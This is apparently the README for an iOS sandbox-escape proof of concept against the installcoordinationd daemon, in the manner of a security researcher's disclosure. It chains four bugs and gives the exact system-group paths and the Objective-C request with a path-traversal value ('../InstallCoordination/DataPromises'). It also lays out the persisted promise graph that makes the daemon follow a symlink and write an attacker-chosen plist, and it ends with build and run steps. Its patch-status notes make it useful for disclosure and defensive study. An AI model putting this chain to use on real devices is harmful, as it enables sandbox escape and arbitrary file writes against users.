# InstallCoordination persisted-state PoC

## Overview

This sandbox escape combines four bugs:

1. Class 13 allowed read/write access to the InstallCoordination system group.
2. The `partDomain` field accepted path traversal.
3. `installcoordinationd` trusted attacker-written persisted objects.
4. Placeholder materialization followed a final symlink.

An app could write a promise graph into daemon state. The daemon then followed
the final symlink and wrote an attacker-selected binary plist.

## Paths accessed

The class-13 request starts at:

```text
/private/var/containers/Shared/SystemGroup/systemgroup.com.apple.installcoordinationd/Library/Caches/
```

The `partDomain` traversal exposed these daemon-state directories:

```text
/private/var/containers/Shared/SystemGroup/systemgroup.com.apple.installcoordinationd/Library/InstallCoordination/PromiseStaging/
/private/var/containers/Shared/SystemGroup/systemgroup.com.apple.installcoordinationd/Library/InstallCoordination/DataPromises/
/private/var/containers/Shared/SystemGroup/systemgroup.com.apple.installcoordinationd/Library/InstallCoordination/Coordinators/
```

The final symlink can select one file path that `installcoordinationd` can
open. The tested target was a scratch file in its system group.

## Entry request

```objc
setClass(query, 13);
setGroup(query,
    xpc_string_create("systemgroup.com.apple.installcoordinationd"));
setFlags(query, (UINT64_C(1) << 39) | (UINT64_C(1) << 32));
setPart(query, 3);
setDomain(query, "../InstallCoordination/DataPromises");
```

## Persisted graph

The graph connects an incomplete placeholder to a completed dictionary
promise:

```objc
IXSPlaceholder *parent = [IXSPlaceholder new];
parent.complete = NO;
parent.localizationPromiseUUID = dictionaryUUID;

IXSPromisedInMemoryDictionary *child =
    [IXSPromisedInMemoryDictionary new];
child.complete = YES;
child.relativePath = @"CodexDictionary-<uuid>.plist";
```

The app copies `PromiseStaging`, then `DataPromises`, then `Coordinators`.
The coordinator commits the graph. The final write target is:

```text
<bundle>/<locale>.lproj/InfoPlist.strings
```

If that final leaf is a symlink, the daemon follows it.

## Patch status

The known normal-app entry is patched in iOS 27 beta 5 (`24A5408d`). The
class-13 request and `partDomain` traversal are blocked. The persisted-graph
and final-symlink bugs remain, but the known app entry cannot reach them.

Runtime testing on an iPhone 11 running iOS 26.5.2 (`23F84`) also returned no
sandbox token for the first state directory. This remained blocked when the
test used the `com.apple.mobile.MobileHouseArrest` CodeDirectory identifier.
The iOS 26.6.1 status is not verified.

## Use

1. Add [`poc.m`](poc.m) and [`promise_graph.m`](promise_graph.m) to an Objective-C iOS target.
2. Prepare `PromiseStaging`, `DataPromises`, and `Coordinators` below one payload directory.
3. Build with the `iphoneos` SDK for `arm64e`.
4. Call `stage_installcoord_payload(payloadRoot, &error)`.

Call `run_installcoord_entry_poc()` for a bounded entry test. It requires a
real sandbox token, writes and reads one unique marker in each state directory,
and removes each marker before it releases the extensions.
